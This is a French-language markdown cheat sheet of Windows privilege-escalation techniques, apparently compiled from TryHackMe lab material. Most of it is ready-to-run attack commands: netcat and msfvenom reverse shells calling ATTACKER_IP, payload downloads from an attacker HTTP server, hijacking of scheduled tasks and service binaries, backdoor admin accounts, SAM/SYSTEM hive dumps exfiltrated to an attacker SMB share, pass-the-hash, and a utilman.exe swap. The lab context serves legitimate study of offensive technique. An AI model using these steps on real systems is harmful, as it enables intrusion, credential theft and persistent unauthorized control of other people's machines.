# Windows

- [Unattended Windows Installations](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#unattended-windows-installations-)
- [Powershell History](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#powershell-history-)
- [Saved Windows Credentials](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#saved-windows-credentials-)
- [IIS Configuration](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#iis-configuration-)
- [PuTTY](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#putty-)
- [Planificateur de tâches](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#planificateur-de-t%C3%A2ches-)
    - [Exploitation ](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#exploitation-)
    - [Exécution manuelle](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#ex%C3%A9cution-manuelle-)
- [AlwaysInstallElevated](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#alwaysinstallelevated-)
- [Insecure Permissions on Service Executable](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#insecure-permissions-on-service-executable-)
- [Unquoted Service Paths](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#unquoted-service-paths-%EF%B8%8F%E2%83%A3)
- [Insecure Service Permissions ](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#insecure-service-permissions-)
- [Si compte avec privilège](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#si-compte-avec-privil%C3%A8ge)
- [SeBackup / SeRestore](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#sebackup--serestore-)
- [TakeOwnership](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#takeownership-)
- [RogueWinRM](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/blob/main/PrivEsc/Windows.md#roguewinrm-)

Quelques sources possibles d'escalation de privilèges sous windows

### Unattended Windows Installations 🔑

Avec MDT:
```
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
```

Peut contenir :

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>domain.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History 📖

cmd.exe
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

powershell.exe
```
cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials 💾

```
cmdkey /list
```

En cas de trouvaille interressante 
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration 🔧

web.config
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY 💻

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
<br>
<br>

### Planificateur de tâches ⏰
Pour lister les tâches planifiées : `schtasks` 

```
schtasks /query /tn vulntask /fo list /v
```
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
Pour obtenir des infos sur `Task To Run`

```
icacls c:\tasks\schtask.bat
```
```
C:\> icacls c:\tasks\schtask.bat
C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

#### Exploitation ⚡

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

#### Exécution manuelle ⚡

```
schtasks /run /tn vulntask
```

### AlwaysInstallElevated 👍

Exploitation de .msi :
Vérifier si ces deux sont présents
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

si oui
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.147.119 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Insecure Permissions on Service Executable 📇

```
sc qc WindowsScheduler
```
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Check des permissions

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
```
C:\Users\unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Création du payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Démarrage d'un serveur http avec python
```
python3 -m http.server
```

Côté victime (Powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
(cmd)
```
move WService.exe WService.exe.bkp
move C:\Users\unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F

(activé un listener côté attaquant)
sc stop windowsscheduler
sc start windowsscheduler
```
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.

### Unquoted Service Paths *️⃣

```
sc qc "disk sorter enterprise"
```

```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/1b70be9e-8275-4d50-86cc-2913795f3829)

Si `C:\MyPrograms\Disk` n'existe pas, alors le programme ira chercher `C:\MyPrograms\Disk Sorter.exe` sinon -> `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`.

```
icacls c:\MyPrograms
```
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
Création du payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Démarrage d'un serveur http avec python
```
python3 -m http.server
```

Côté victime (Powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
(cmd)
```
move C:\Users\unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls Disk.exe /grant Everyone:F

(activé un listener côté attaquant)
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

### Insecure Service Permissions 🔓

Utilisation de <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk</a> sur un service pour checker ses permissions.
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/162115a0-3294-4ad6-8054-1d982037f674)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
[Victime] (PowerShell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
[Attaquant]
```
nc -lvp 4447
```
[Victime]
```
icacls C:\Users\unpriv\rev-svc3.exe /grant Everyone:F
```

```
sc config MyService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
```
sc stop MyService
sc start MyService
```

### Si compte avec privilège 

```
net user <username> <password> /add
net localgroup administrators <username> /add
```

<br>
<br>

## SeBackup / SeRestore 🔓

Ouvrir un cmd en tant qu'admin (si utilisateur à des droits admins

```
reg save hklm\system C:\Users\MyUser\system.hive
```
```
reg save hklm\sam C:\Users\MyUser\sam.hive
```

Utiliser un système de partage type <a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">smbserver.py</a>. Cloner le <a href="https://github.com/fortra/impacket/tree/master/examples">dépôt</a> GitHub aussi !

```
mkdir share
python3 smbserver.py -smb2support -username MyUser -password MyPassword public share
```

[Victime]
```
copy C:\Users\MyUser\sam.hive \\ATTACKER_IP\public\
copy C:\Users\MyUser\system.hive \\ATTACKER_IP\public\
```
[Attaquant]
```
python3 /examples/secretsdump.py -sam share/sam.hive -system share/system.hive LOCAL
```
Pass The Hash ->
```
python3 /examples/psexec.py -hashes <the:Hash> administrator@<ip>
```
<br>
<br>

## TakeOwnership 🔓

Ouvrir un cmd en tant qu'admin
<br>
Exemple de utilman.exe qui tourne en tant qu'utilisateur SYSTEM
```
takeown /f C:\Windows\System32\Utilman.exe
```
il est aussi possible de donner toutes les permissions à un utilisateur
```
icacls C:\Windows\System32\Utilman.exe /grant MyUser:F
```
On remplace l'exécutable `utilman.exe` en `cmd.exe`
```
copy cmd.exe utilman.exe
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/ab9b63a7-8d8e-45d8-abd8-8bff4b70ff61)

## RogueWinRM 😈

Lien de l'exécutable <a href="https://github.com/antonioCoco/RogueWinRM">ici</a>.
<br>
Détail de la procédure d'utilisation s'y trouve également.

Crédit: TryHackMe
